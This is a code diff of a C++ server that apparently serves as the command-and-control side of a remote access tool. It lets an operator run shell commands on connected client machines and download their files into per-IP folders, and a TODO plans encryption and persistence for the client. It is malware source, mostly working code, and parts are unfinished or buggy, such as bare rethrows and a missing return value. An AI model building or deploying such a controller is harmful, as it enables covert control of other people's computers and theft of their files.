@@ -8,12 +8,17 @@
 #include <iostream>
 #include <stdlib.h>
 
+// TODO - take this function to "common utils"
 std::string EnvVariable(const std::string& envVariable)
 {
     char* buf = nullptr;
     size_t sz = 0;
     return (_dupenv_s(&buf, &sz, envVariable.c_str()) == 0 && buf != nullptr) ? std::string(buf) : "Error";
 }
+
+// TODO - Add here and in the client Encrypt, Decrypt, Persistence... Move this to a "Globals" project. 
+enum OperationType { RunCommand = 1, DownloadFile, UploadFile, Invalid };
+
 
 class Session : public std::enable_shared_from_this<Session>
 {
@@ -24,25 +29,161 @@ public:
     Session(TcpSocket socket)
         : m_socket(std::move(socket))
     {
-        SetClientDedicatedDirectory();
+        CreateClientDedicatedDirectory();
     }
 
 private:
-    void SetClientDedicatedDirectory()
+    void CreateClientDedicatedDirectory()
     {
         std::string userHomeDirectory(EnvVariable("USERPROFILE"));
         std::string clientIp(m_socket.remote_endpoint().address().to_string());
+        std::cout << "Connected to: " << clientIp << std::endl;
         m_clientDedicatedDirectory = (std::filesystem::path(userHomeDirectory) / "Downloads" / "Dst" / clientIp).string();
         std::filesystem::create_directory(m_clientDedicatedDirectory);
         std::filesystem::current_path(m_clientDedicatedDirectory);
+        std::cout << "Created directory: " << m_clientDedicatedDirectory << std::endl;
     }
 
 public:
     void start()
     {
-        auto buf = boost::asio::buffer("Command\n\nads", 10);
+        while (true)
+        {
+            switch (ReadOperationType())
+            {
+            case RunCommand:
+                Command();
+                break;
+            case DownloadFile:
+                Download();
+                break;
+            default:
+                std::cout << "Invalid operation! Type the number of a option from the menu!" << std::endl;
+                break;
+            }
+
+        }
+    }
+
+    OperationType ReadOperationType()
+    {
+        PrintOptionsMenu();
+        std::string operation;
+        std::getline(std::cin >> std::ws, operation);
+
+        return GetOperationType(operation);
+    }
+
+    void PrintOptionsMenu()
+    {
+        std::cout << "\n\n============  Choose an operation ============\n"
+            << "1) Run command\n"
+            << "2) Download file\n"
+            << "3) Upload file\n"
+            << "[+] Your choise - ";
+    }
+
+    OperationType GetOperationType(const std::string& operation)
+    {
+        std::unordered_map<std::string, OperationType> operations
+        {
+            {"1", RunCommand},
+            {"2", DownloadFile},
+            {"3", UploadFile}
+        };
+
+        if (!operations.count(operation))
+            return Invalid;
+
+        return operations[operation];
+    }
+
+    void Command()
+    {
+        auto command = ReadOperationInstruction("Write command");
+        std::string request("RunCommand" + m_delimiter + command + m_delimiter);
+
+        SendRequest(request);
+        auto commandOutput = Response();
+        std::cout << std::endl << commandOutput << std::endl;
+    }
+
+    std::string ReadOperationInstruction(const std::string& operation)
+    {
+        std::cout << "\n\n[+]" << operation << ": ";
+        std::string instruction;
+        std::getline(std::cin >> std::ws, instruction);
+        return instruction;
+    }
+
+    void SendRequest(const std::string& request)
+    {
+        auto buf = boost::asio::buffer(request);
         Send(buf);
-        doRead();
+    }
+
+    std::string Response()
+    {
+        auto responseSize = boost::asio::read_until(m_socket, m_responseBuf, m_delimiter, m_errorCode);
+        if (m_errorCode)
+            throw; // TODO - handle error
+
+        return CleanReponse(responseSize);
+    }
+
+    std::string CleanReponse(size_t responseSize)
+    {
+        std::string response(
+            buffers_begin(m_responseBuf.data()),
+            buffers_begin(m_responseBuf.data()) + responseSize - m_delimiter.size()
+        );
+        m_responseBuf.consume(responseSize);
+
+        return response;
+    }
+
+    void Download()
+    {
+        auto filePath = ReadOperationInstruction("Full path of file on client");
+        auto request = "DownloadFile" + m_delimiter + filePath + m_delimiter;
+        CreateFileLocally(filePath);
+        SendRequest(request);
+
+        auto fileSize = IncomingFileSize();
+        while (fileSize > 0)
+        {
+            auto bufferSize = (fileSize < m_buf.size()) ? fileSize : m_buf.size();
+            auto buf = boost::asio::buffer(m_buf, bufferSize);
+            auto responseSize = boost::asio::read(m_socket, buf, m_errorCode);
+            m_file.write(m_buf.data(), responseSize);
+
+            fileSize -= responseSize;
+            std::cout << "Remaining bytes: " << fileSize << "\nResponse Size: " << responseSize << "\n Response data:" << buf.data() << std::endl;
+        }
+        m_file.close();
+        std::cout << "File downloaded to - " << filePath << std::endl;
+    }
+
+    void CreateFileLocally(const std::string& filePath)
+    {
+        auto fileName = std::filesystem::path(filePath).filename().string();
+        auto fileToCreate = (std::filesystem::path(m_clientDedicatedDirectory) / fileName).string();
+        m_file.open(fileToCreate, std::ios::out | std::ios::binary);
+        if (!m_file)
+            throw; // TODO - throw specific exception
+    }
+
+    int IncomingFileSize()
+    {
+        try
+        {
+            auto response = Response();
+            return std::stoi(response);
+        }
+        catch (std::invalid_argument& ex)
+        {
+            ; //TODO - Throw exception. This means that the first part of the response wasn't a number representing the incoming file size;
+        }
     }
 
 private:
@@ -50,11 +191,9 @@ private:
     template<typename Buffer>
     void Send(Buffer& t_buffer)
     {
-        boost::asio::async_write(m_socket, t_buffer,
-            [this](const boost::system::error_code& ec, std::size_t)
-            {
-                //ReadFileBytes(ec);
-            });
+        boost::asio::write(m_socket, t_buffer, m_errorCode);
+        if (m_errorCode)
+            throw; // TODO - handle error (reset the connection & reset the m_errorCode to 0)
     }
 
     // Read until we meet "\n\n"
@@ -62,15 +201,20 @@ private:
     {
         auto self = shared_from_this(); // return another shared_pointer to the *this
 
+        m_responseBuf.consume(m_responseBuf.size());
+        auto responseSize = boost::asio::read_until(m_socket, m_responseBuf, "\n\n", m_errorCode);
+        if (m_errorCode)
+            throw; // TODO - handle error
+
         // We recive data from the socket, and read until "\n\n". Now m_requestBuf is suppose to hold the file name and size. 
-        async_read_until(m_socket, m_requestBuf, "\n\n",
-            [this, self](boost::system::error_code ec, size_t bytes)
-            {
-                if (!ec)
-                processRead(bytes);
-                else
-                    handleError(__FUNCTION__, ec); // Maybe the error can be EOF ?
-            });
+        //async_read_until(m_socket, m_requestBuf, "\n\n",
+        //    [this, self](boost::system::error_code ec, size_t bytes)
+        //    {
+        //        if (!ec)
+        //        processRead(bytes);
+        //        else
+        //            handleError(__FUNCTION__, ec); // Maybe the error can be EOF ?
+        //    });
     }
 
     void processRead(size_t t_bytesTransferred)
@@ -85,7 +229,7 @@ private:
         // Check what this does exactly
         do {
             requestStream.read(m_buf.data(), m_buf.size());
-            m_outputFile.write(m_buf.data(), requestStream.gcount()); // break point insdie the gcount(). Check its return value.
+            m_file.write(m_buf.data(), requestStream.gcount()); // break point insdie the gcount(). Check its return value.
         } while (requestStream.gcount() > 0);
 
 
@@ -118,8 +262,8 @@ private:
 
     void createFile()
     {
-        m_outputFile.open(m_fileName, std::ios_base::binary);
-        if (!m_outputFile) {
+        m_file.open(m_fileName, std::ios_base::binary);
+        if (!m_file) {
             return;
         }
     }
@@ -128,10 +272,10 @@ private:
     {
         // If we recived more then 0 bytes, write them to the destination file. 
         if (t_bytesTransferred > 0) {
-            m_outputFile.write(m_buf.data(), static_cast<std::streamsize>(t_bytesTransferred));
+            m_file.write(m_buf.data(), static_cast<std::streamsize>(t_bytesTransferred));
 
             // If the bytes amount we allready got are equal to the m_fileSize we recived in Session::readData() , end the operation. 
-            if (m_outputFile.tellp() >= static_cast<std::streamsize>(m_fileSize)) {
+            if (m_file.tellp() >= static_cast<std::streamsize>(m_fileSize)) {
                 std::cout << "Received file: " << m_fileName << std::endl;
                 Clean();
                 return;
@@ -150,7 +294,7 @@ private:
 
     void Clean()
     {
-        m_outputFile.clear();
+        m_file.clear();
         m_requestBuf.consume(m_requestBuf.size());
     }
 
@@ -164,10 +308,13 @@ private:
     TcpSocket m_socket;
     std::array<char, 1024> m_buf;
     boost::asio::streambuf m_requestBuf;
-    std::ofstream m_outputFile;
+    boost::asio::streambuf m_responseBuf;
+    std::fstream m_file;
     size_t m_fileSize;
     std::string m_fileName;
-    std::string m_clientDedicatedDirectory;
+    std::string m_clientDedicatedDirectory; // Convert this to a map of IP-directoryPath so it could handle multiple clients
+    boost::system::error_code m_errorCode;
+    std::string m_delimiter = "\r\n\r\n";
 };
 
 
